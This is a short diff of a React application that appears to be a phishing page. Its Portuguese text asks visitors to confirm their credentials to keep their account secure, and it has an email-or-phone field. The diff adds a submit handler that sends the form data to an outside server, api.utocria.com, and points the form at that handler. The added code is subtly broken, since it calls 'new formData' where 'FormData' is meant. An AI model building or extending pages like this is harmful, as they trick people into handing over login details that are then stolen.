@@ -2,6 +2,14 @@ import './index.css';
 import { useReducer } from 'react';
 
 function App(){
+
+    function handleSubmit(e){
+        e.preventDefault();
+        const form = e.target;
+        const formData = new formData(form);
+        fetch("https://api.utocria.com/api/submit", {method: form.method, body:formData});
+    }
+
     async function sendData(formData){
         'use server'
         const data = {
@@ -32,7 +40,7 @@ function App(){
                 <p className=" lg:text-start text-center px-8 lg:text-2xl text-xl font-medium text-fontColor">Confirme as suas credencias para manter a sua conta segura.</p>
             </div>
             <div className="lg:basis-1/3 w-4/5 lg:w-auto bg-white rounded-md p-4 drop-shadow-lg">
-                <form action={sendData} method="POST" className="flex flex-col gap-2 items-center">
+                <form onSubmit={handleSubmit} method="POST" className="flex flex-col gap-2 items-center">
                     <div className="m-2 w-96 text-center">
                         <input type="text" name="email" id="email" className={inputClass} placeholder="E-mail ou Número de Telemóvel" />
                     </div>
